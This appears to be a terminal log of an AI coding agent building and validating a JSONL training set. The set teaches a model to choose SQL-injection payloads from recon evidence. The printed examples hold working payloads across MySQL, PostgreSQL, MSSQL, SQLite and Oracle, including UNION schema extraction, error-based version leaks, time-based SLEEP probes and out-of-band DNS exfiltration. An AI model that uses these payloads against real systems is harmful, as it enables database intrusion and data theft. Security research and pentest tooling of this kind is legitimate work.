@@ -1,0 +1,200 @@
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m→ [0mRead training_resources/enrichment/specs/sqli_a.md
+[0m✱ [0mGlob "training_resources/enrichment/candidates/*"[90m 0 matches[0m
+[0m
+[0m← [0mWrite training_resources/enrichment/candidates/sqli_a.jsonl
+Wrote file successfully.
+[0m
+[0m$ [0mpython3 -c "
+import json
+with open('training_resources/enrichment/candidates/sqli_a.jsonl', 'r') as f:
+    lines = f.readlines()
+print(f'Total lines: {len(lines)}')
+for i, line in enumerate(lines, 1):
+    line = line.strip()
+    if not line:
+        print(f'Line {i}: EMPTY')
+        continue
+    try:
+        obj = json.loads(line)
+        messages = obj.get('messages', [])
+        print(f'Line {i}: {len(messages)} messages')
+        if len(messages) != 3:
+            print(f'  ERROR: Expected 3 messages, got {len(messages)}')
+        else:
+            roles = [m.get('role') for m in messages]
+            print(f'  Roles: {roles}')
+            if roles != ['system', 'user', 'assistant']:
+                print(f'  ERROR: Wrong role order')
+            assistant_content = messages[2].get('content', '')
+            try:
+                assistant_json = json.loads(assistant_content)
+                keys = list(assistant_json.keys())
+                expected_keys = ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+                print(f'  Assistant keys: {keys}')
+                if keys != expected_keys:
+                    print(f'  ERROR: Keys mismatch. Expected: {expected_keys}')
+                injection_point = assistant_json.get('injection_point')
+                valid_points = ['query', 'body', 'header', 'cookie', 'path']
+                if injection_point not in valid_points:
+                    print(f'  ERROR: Invalid injection_point: {injection_point}')
+                confidence = assistant_json.get('confidence')
+                if not (0.0 <= confidence <= 1.0):
+                    print(f'  ERROR: Confidence out of range: {confidence}')
+                print(f'  Target: {assistant_json.get(\"target_param\")}, Payload: {assistant_json.get(\"payload\")[:50]}...')
+            except json.JSONDecodeError as e:
+                print(f'  ERROR: Assistant content not valid JSON: {e}')
+    except json.JSONDecodeError as e:
+        print(f'Line {i}: Invalid JSON - {e}')
+"
+Total lines: 17
+Line 1: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: category, Payload: '...
+Line 2: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: sort, Payload: created_at,1...
+Line 3: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: email, Payload: test' OR '1'='1...
+Line 4: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: q, Payload: laptop' OR 1=1--...
+Line 5: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: article_id, Payload: 42 OR 1=1...
+Line 6: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: X-Forwarded-For, Payload: 192.168.1.1' UNION SELECT NULL,sql FROM sqlite_mas...
+Line 7: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: customer_id, Payload: 100 UNION SELECT NULL,NULL,NULL,group_concat(table...
+Line 8: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: user, Payload: alice'||CAST((SELECT version()) AS TEXT)||'...
+Line 9: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: file_id, Payload: 55; SELECT @@version--...
+Line 10: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: status, Payload: open' UNION SELECT NULL,NULL FROM dual--...
+Line 11: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: session_id, Payload: abc123' OR SLEEP(5)--...
+Line 12: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: price, Payload: 29.99 OR TRUE...
+Line 13: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: slug, Payload: hello-world' UNION SELECT NULL,title,body FROM pos...
+Line 14: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: format, Payload: pdf' AND 1=CAST(@@version AS INT)--...
+Line 15: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: subject, Payload: Issue'||UTL_INADDR.GET_HOST_ADDRESS((SELECT user F...
+Line 16: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: dept, Payload: cs' OR '1'='1...
+Line 17: 3 messages
+  Roles: ['system', 'user', 'assistant']
+  Assistant keys: ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+  Target: Referer, Payload: https://example.com' UNION SELECT NULL,schema_name...
+[0m
+[0m$ [0mcat -n training_resources/enrichment/candidates/sqli_a.jsonl | tail -5
+13	{"messages": [{"role": "system", "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."}, {"role": "user", "content": "Endpoint: GET /blog/post/hello-world\nTarget parameter(s): slug (path segment)\nRecon evidence: /blog/post/hello-world returns post; /blog/post/hello-world' returns SQLite error: 'unrecognized token: \"hello-world'\"'.\nPlanner's rationale: SQLite error on path segment confirms injection in string context."}, {"role": "assistant", "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"slug\", \"payload\": \"hello-world' UNION SELECT NULL,title,body FROM posts--\", \"injection_point\": \"path\", \"expected_success_signal\": \"Blog post titles and bodies returned in response (UNION-based extraction)\", \"confidence\": 0.65, \"reasoning\": \"The SQLite error on the path segment confirms string context injection; the UNION payload targets the posts table with NULL padding for the id column, extracting title and body for data exfiltration.\"}"}]}
+    14	{"messages": [{"role": "system", "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."}, {"role": "user", "content": "Endpoint: GET /api/reports?format=pdf\nTarget parameter(s): format\nRecon evidence: format=pdf returns PDF; format=pdf' returns MSSQL error: 'Incorrect syntax near '''.'\nPlanner's rationale: MSSQL error on string parameter; test error-based with conversion trick."}, {"role": "assistant", "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"format\", \"payload\": \"pdf' AND 1=CAST(@@version AS INT)--\", \"injection_point\": \"query\", \"expected_success_signal\": \"MSSQL version leaked via conversion error in HTTP response (error-based extraction)\", \"confidence\": 0.7, \"reasoning\": \"The MSSQL syntax error confirms string context; the payload uses MSSQL's CAST conversion error technique to force @@version into an integer conversion error, leaking the version string.\"}"}]}
+    15	{"messages": [{"role": "system", "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."}, {"role": "user", "content": "Endpoint: POST /support/tickets\nTarget parameter(s): subject (form body)\nRecon evidence: subject=Issue returns ticket created; subject=Issue' returns Oracle error: 'ORA-01756: quoted string not properly terminated'.\nPlanner's rationale: Oracle error on form body string parameter confirms injection."}, {"role": "assistant", "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"subject\", \"payload\": \"Issue'||UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--\", \"injection_point\": \"body\", \"expected_success_signal\": \"DNS lookup triggered with Oracle username as subdomain (out-of-band exfiltration)\", \"confidence\": 0.55, \"reasoning\": \"The Oracle error confirms string concatenation; the payload uses Oracle's UTL_INADDR.GET_HOST_ADDRESS for out-of-band DNS exfiltration of the current database user, bypassing potential response filtering.\"}"}]}
+    16	{"messages": [{"role": "system", "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."}, {"role": "user", "content": "Endpoint: GET /courses?dept=cs\nTarget parameter(s): dept\nRecon evidence: dept=cs returns courses; dept=cs' returns PostgreSQL error: 'ERROR: syntax error at or near \"cs'\"'.\nPlanner's rationale: PostgreSQL error on string parameter; test boolean-based with minimal payload."}, {"role": "assistant", "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"dept\", \"payload\": \"cs' OR '1'='1\", \"injection_point\": \"query\", \"expected_success_signal\": \"All departments' courses returned (boolean-based true condition)\", \"confidence\": 0.5, \"reasoning\": \"The PostgreSQL error confirms string context injection; the tautology payload tests boolean-based blind exploitation with minimal syntax, suitable for exploratory probing with moderate evidence.\"}"}]}
+    17	{"messages": [{"role": "system", "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."}, {"role": "user", "content": "Endpoint: GET /api/v3/analytics\nTarget parameter(s): Referer header\nRecon evidence: Referer: https://example.com returns 200; Referer: https://example.com' returns MySQL error: 'You have an error in your SQL syntax near ''' at line 1'.\nPlanner's rationale: MySQL error on Referer header confirms injection in header context."}, {"role": "assistant", "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"Referer\", \"payload\": \"https://example.com' UNION SELECT NULL,schema_name FROM information_schema.schemata--\", \"injection_point\": \"header\", \"expected_success_signal\": \"Database schema names returned in response via UNION (UNION-based extraction)\", \"confidence\": 0.6, \"reasoning\": \"The MySQL error on the Referer header confirms string context injection; the UNION payload extracts schema names from information_schema with NULL padding, leveraging the header injection point for data exfiltration.\"}"}]}
+[0m
+[0m$ [0mhead -15 training_resources/enrichment/candidates/sqli_a.jsonl > training_resources/enrichment/candidates/sqli_a.jsonl.tmp && mv training_resources/enrichment/candidates/sqli_a.jsonl.tmp training_resources/enrichment/candidates/sqli_a.jsonl
+(no output)
+[0m
+[0m$ [0mpython3 -c "
+import json
+with open('training_resources/enrichment/candidates/sqli_a.jsonl', 'r') as f:
+    lines = f.readlines()
+print(f'Total lines: {len(lines)}')
+targets_payloads = set()
+injection_points = set()
+dbms_covered = set()
+for i, line in enumerate(lines, 1):
+    line = line.strip()
+    if not line:
+        print(f'Line {i}: EMPTY')
+        continue
+    try:
+        obj = json.loads(line)
+        messages = obj.get('messages', [])
+        if len(messages) != 3:
+            print(f'Line {i}: ERROR - Expected 3 messages, got {len(messages)}')
+        roles = [m.get('role') for m in messages]
+        if roles != ['system', 'user', 'assistant']:
+            print(f'Line {i}: ERROR - Wrong role order: {roles}')
+        assistant_content = messages[2].get('content', '')
+        assistant_json = json.loads(assistant_content)
+        keys = list(assistant_json.keys())
+        expected_keys = ['vuln_class', 'target_param', 'payload', 'injection_point', 'expected_success_signal', 'confidence', 'reasoning']
+        if keys != expected_keys:
+            print(f'Line {i}: ERROR - Keys mismatch: {keys}')
+        injection_point = assistant_json.get('injection_point')
+        valid_points = ['query', 'body', 'header', 'cookie', 'path']
+        if injection_point not in valid_points:
+            print(f'Line {i}: ERROR - Invalid injection_point: {injection_point}')
+        injection_points.add(injection_point)
+        confidence = assistant_json.get('confidence')
+        if not (0.0 <= confidence <= 1.0):
+            print(f'Line {i}: ERROR - Confidence out of range: {confidence}')
+        target = assistant_json.get('target_param')
+        payload = assistant_json.get('payload')
+        pair = (target, payload)
+        if pair in targets_payloads:
+            print(f'Line {i}: ERROR - Duplicate (target_param, payload): {pair}')
+        targets_payloads.add(pair)
+        print(f'Line {i}: OK - {target} | {injection_point} | conf={confidence} | {payload[:60]}...')
+    except json.JSONDecodeError as e:
+        print(f'Line {i}: Invalid JSON - {e}')
+
+print(f'\\nUnique injection_points: {injection_points}')
+print(f'Unique (target_param, payload) pairs: {len(targets_payloads)}')
+"
+Total lines: 15
+Line 1: OK - category | query | conf=0.95 | '...
+Line 2: OK - sort | query | conf=0.9 | created_at,1...
+Line 3: OK - email | body | conf=0.85 | test' OR '1'='1...
+Line 4: OK - q | query | conf=0.8 | laptop' OR 1=1--...
+Line 5: OK - article_id | path | conf=0.75 | 42 OR 1=1...
+Line 6: OK - X-Forwarded-For | header | conf=0.7 | 192.168.1.1' UNION SELECT NULL,sql FROM sqlite_master--...
+Line 7: OK - customer_id | body | conf=0.85 | 100 UNION SELECT NULL,NULL,NULL,group_concat(table_name) FRO...
+Line 8: OK - user | query | conf=0.8 | alice'||CAST((SELECT version()) AS TEXT)||'...
+Line 9: OK - file_id | query | conf=0.75 | 55; SELECT @@version--...
+Line 10: OK - status | query | conf=0.65 | open' UNION SELECT NULL,NULL FROM dual--...
+Line 11: OK - session_id | cookie | conf=0.7 | abc123' OR SLEEP(5)--...
+Line 12: OK - price | body | conf=0.6 | 29.99 OR TRUE...
+Line 13: OK - slug | path | conf=0.65 | hello-world' UNION SELECT NULL,title,body FROM posts--...
+Line 14: OK - format | query | conf=0.7 | pdf' AND 1=CAST(@@version AS INT)--...
+Line 15: OK - subject | body | conf=0.55 | Issue'||UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))...
+
+Unique injection_points: {'query', 'header', 'path', 'body', 'cookie'}
+Unique (target_param, payload) pairs: 15
+[0m
+Verified: 15 lines, all valid JSONL with correct structure, 5 injection points covered (query, body, header, cookie, path), all confidence values in range 0.0-1.0, no duplicate (target_param, payload) pairs, all 7 assistant keys in exact order.
